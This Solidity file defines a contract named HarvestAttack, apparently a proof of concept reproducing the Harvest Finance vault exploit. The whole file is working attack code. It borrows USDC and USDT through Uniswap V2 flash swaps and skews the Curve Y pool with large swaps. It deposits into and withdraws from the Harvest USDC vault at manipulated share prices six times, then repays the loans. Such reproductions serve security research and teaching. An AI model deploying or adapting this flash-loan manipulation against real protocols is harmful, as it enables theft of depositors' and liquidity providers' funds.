// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.10;

import './IUniswapV2Pair.sol';
import './IcurveYSwap.sol';
import './Harvest.sol';
import '@openzeppelin/contracts/token/ERC20/IERC20.sol';
import 'hardhat/console.sol';

interface IUSDT {
    function approve(address _spender, uint256 _value) external;

    function balanceOf(address owner) external view returns (uint256);

    function transfer(address _to, uint256 _value) external;
}

contract HarvestAttack {
    address public usdcPair;
    address public usdtPair;
    address public curveYSwap;
    address public harvest;
    address public usdc;
    address public usdt;
    address public fusdc;
    address public fusdt;
    address public yusdc;
    address public yusdt;

    uint256 usdcLoan = 50_000_000 * 10 ** 6;
    uint256 usdcRepayment = (usdcLoan * 100_301) / 100_000;
    uint256 usdtLoan = 17_300_000 * 10 ** 6;
    uint256 usdtRepayment = (usdtLoan * 100_301) / 100_000;
    uint256 usdcBal;
    uint256 usdtBal;

    constructor(
        address _usdcPair,
        address _usdtPair,
        address _curveYSwap,
        address _harvest,
        address _usdc,
        address _usdt,
        address _fusdc,
        address _fusdt
    ) {
        usdcPair = (_usdcPair);
        usdtPair = (_usdtPair);
        curveYSwap = (_curveYSwap);
        harvest = (_harvest);
        usdc = (_usdc);
        usdt = (_usdt);
        fusdc = (_fusdc);
        fusdt = (_fusdt);
    }

    function startAttack() external {
        console.log('Starting attack');
        IUSDT(usdt).approve(curveYSwap, type(uint256).max);
        IERC20(usdc).approve(curveYSwap, type(uint256).max);
        IERC20(usdc).approve(harvest, type(uint256).max);
        IUSDT(usdt).approve(usdtPair, type(uint256).max);
        IERC20(usdc).approve(usdcPair, type(uint256).max);

        console.log('Before exploitation, USDC balance of attacker:', IERC20(usdc).balanceOf(address(this)) / 1e6);
        console.log('Before exploitation, USDT balance of attacker:', IUSDT(usdt).balanceOf(address(this)) / 1e6);

        IUniswapV2Pair(usdcPair).swap(usdcLoan, 0, address(this), '0x');
        console.log('After');
        // console.log('After exploitation, USDC balance of attacker:', IERC20(usdc).balanceOf(address(this)) / 1e6);
        // console.log('After exploitation, USDT balance of attacker:', IUSDT(usdt).balanceOf(address(this)) / 1e6);
    }

    function uniswapV2Call(address, uint256, uint256, bytes calldata) external {
        if (msg.sender == address(usdcPair)) {
            console.log('Flashloan, Amount of USDC received:', IERC20(usdc).balanceOf(address(this)) / 1e6);
            IUniswapV2Pair(usdtPair).swap(0, usdtLoan, address(this), '0x');
            bool usdcSuccess = IERC20(usdc).transfer(address(usdcPair), usdcRepayment);
        }

        if (msg.sender == address(usdtPair)) {
            console.log('Flashloan, Amount of USDT received:', IUSDT(usdt).balanceOf(address(this)) / 1e6);
            for (uint256 i = 0; i < 6; i++) {
                theSwap(i);
            }
            IUSDT(usdt).transfer(msg.sender, usdtRepayment);
        }
    }

    function theSwap(uint256 i) internal {
        console.log('#1', IERC20(fusdc).balanceOf(address(this)) / 1e6);
        IcurveYSwap(curveYSwap).exchange_underlying(2, 1, 17_200_000 * 10 ** 6, 17_000_000 * 10 ** 6);

        console.log('#2', IERC20(fusdc).balanceOf(address(this)) / 1e6);
        IHarvestUsdcVault(harvest).deposit(49_000_000_000_000);
        console.log('#3', IERC20(fusdc).balanceOf(address(this)) / 1e6);
        IcurveYSwap(curveYSwap).exchange_underlying(1, 2, 17_310_000 * 10 ** 6, 17_000_000 * 10 ** 6);

        console.log('#4', IERC20(fusdc).balanceOf(address(this)) / 1e6);
        IHarvestUsdcVault(harvest).withdraw(IERC20(fusdc).balanceOf(address(this)));

        console.log('WTF2');
    }

    receive() external payable {}
}
